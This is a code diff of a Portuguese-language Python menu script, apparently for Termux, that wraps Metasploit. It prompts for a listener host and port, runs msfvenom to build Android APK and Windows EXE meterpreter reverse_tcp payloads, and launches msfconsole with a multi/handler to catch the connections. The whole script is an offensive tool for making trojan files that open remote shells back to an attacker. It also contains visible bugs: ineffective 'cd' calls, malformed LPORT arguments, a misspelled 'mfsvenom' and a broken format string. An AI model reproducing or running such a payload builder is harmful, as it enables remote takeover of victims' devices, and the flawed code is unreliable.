@@ -43,6 +43,7 @@ def ver():
 				exit()
 		
 def menu():
+	pasta="/data/data/com.termux/files/usr/home/metasploit-framework"
 	os.system("clear")
 	print '''
  ____  ____  ___  ____  ____  _____ 
@@ -59,26 +60,29 @@ def menu():
 	'''
 	op=int(str(raw_input("OPÇÃO: ")))
 	if op == 1:
+		os.system("cd %s"%(pasta))
 		os.system('clear')
 		lhost=raw_input("LHOST: ")
 		lport=int(raw_input("LPORT: "))
 		nome=raw_input("NOME: ")
 		os.system("clear")
 		print "GERANDO APK NA PASTA /SDCARD/EXPLOIT/%s.apk"%(nome)
-		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT:=%s R > /sdcard/exploit/%s.apk"%(lhost, lport, nome))
+		os.system("./msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT:=%s R > /sdcard/exploit/%s.apk"%(lhost, lport, nome))
 		os.system("clear")
 		print "PRONTO"
 	elif op == 2:
+		os.system("cd %s"%(pasta))
 		os.system("clear")
 		lhost=raw_input("LHOST: ")
 		lport=int(raw_input("LPORT: "))
 		nome=raw_input("NOME: ")
 		os.system("clear")
 		print "GERANDO EXE NA PASTA SDCARD/EXPLOIT/ %s"%(nome)
-		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s LPORT=%s R > /sdcard/exploit/%s.exe"%(lhost, lport, nome))
+		os.system("./msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s LPORT=%s R > /sdcard/exploit/%s.exe"%(lhost, lport, nome))
 		os.system("clear")
 		print "PRONTO"
 	elif op == 3:
+		os.system("cd %s"%(pasta))
 		os.system("clear")
 		payload=raw_input("PAYLOAD: ")
 		lhost=raw_input("LHOST: ")
@@ -87,16 +91,17 @@ def menu():
 		print "EX: apk, exe etc"
 		fort=raw_input("FORMATO DO EXPLOIT: ")
 		print "GERANDO %fort NA PASTA SDCARD/EXPLOIT/%nome"%(fort, nome)
-		os.system("mfsvenom -p %payload LHOST=%s LPORT=%s R > /sdcard/exploit/%s.%s"(payload, lhost, lport, nome, fort))
+		os.system("./mfsvenom -p %payload LHOST=%s LPORT=%s R > /sdcard/exploit/%s.%s"(payload, lhost, lport, nome, fort))
 		os.system("clear")
 		print "PRONTO"
 	elif op == 4:
+		os.system("cd %s"%(pasta))
 		port=int(raw_input("LPORTA: "))
 		payload='set payload android/meterpreter/reverse_tcp \nset lhost 0.0.0.0 \nset lport %s \nuse exploit/multi/handler \nexploit'%(port)
 		os.system("echo '%s' > $HOME/payload.rb"%(payload))
 		print "PARA USAR O MSGCONSOLE JA PRONTO USE O COMANDO \nmsfconsole -r payload.rb"
 		time.sleep(1)
-		os.system("msfconsole -r $HOME/payload.rb")
+		os.system("./msfconsole -r $HOME/payload.rb")
 		os.system("clear")
 	elif op == 5:
 		print "SAINDO..."
